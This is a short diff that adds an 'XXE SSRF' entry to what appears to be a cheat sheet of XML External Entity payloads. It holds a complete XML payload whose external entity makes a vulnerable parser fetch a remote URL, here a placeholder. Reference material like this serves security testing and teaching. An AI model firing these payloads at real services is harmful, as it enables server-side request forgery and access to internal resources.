@@ -62,3 +62,10 @@ XXE PHP Wrapper
     <city>Paris</city>
   </contact>
 </contacts>
+
+XXE SSRF
+----------
+<?xml version="1.0"?>
+<!DOCTYPE foo [  
+<!ELEMENT foo (#ANY)>
+<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>
